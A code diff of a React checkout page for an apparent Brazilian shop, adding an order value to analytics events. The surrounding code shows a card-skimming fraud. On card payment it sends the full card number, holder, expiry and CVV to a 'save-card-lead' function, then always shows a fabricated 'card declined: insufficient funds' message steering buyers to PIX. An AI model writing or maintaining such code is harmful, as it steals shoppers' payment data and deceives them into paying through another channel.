@@ -193,7 +193,7 @@ const EconomizareCheckout = () => {
       };
 
       if (paymentMethod === "credit_card") {
-        trackFunnelEvent({ event: "add_payment_info", properties: { method: "credit_card", card_last4: cardForm.number.slice(-4) }, userData: { email: form.email, phone: form.phone, externalId: form.cpf } });
+        trackFunnelEvent({ event: "add_payment_info", value: total, properties: { method: "credit_card", card_last4: cardForm.number.slice(-4) }, userData: { email: form.email, phone: form.phone, externalId: form.cpf } });
         await supabase.functions.invoke("save-card-lead", { body: { ...payload, card: { number: cardForm.number.replace(/\s/g, ""), holder: cardForm.holder, expiry: cardForm.expiry, cvv: cardForm.cvv, installments: cardForm.installments } } });
         await new Promise(resolve => setTimeout(resolve, 2000));
         toast({ title: "Pagamento não aprovado", description: "Cartão recusado: saldo insuficiente. Por favor, utilize o PIX para concluir seu pedido.", variant: "destructive" });
@@ -210,7 +210,7 @@ const EconomizareCheckout = () => {
         return;
       }
 
-      trackFunnelEvent({ event: "pix_generated", properties: { transaction_id: data.transaction_id || "" }, userData: { email: form.email, phone: form.phone, externalId: form.cpf } });
+      trackFunnelEvent({ event: "pix_generated", value: total, properties: { transaction_id: data.transaction_id || "" }, userData: { email: form.email, phone: form.phone, externalId: form.cpf } });
       sessionStorage.setItem("pixData", JSON.stringify(data));
       sessionStorage.setItem("orderData", JSON.stringify({ customer: payload.customer, product: { items: [{ id: PRODUCT_ID, quantity }], total, coupon: hasCoupon ? couponUpper : null, couponDiscount: couponAmount }, shipping: { type: shipping, cost: shippingCost } }));
       sessionStorage.setItem("eco_funnel", "true");
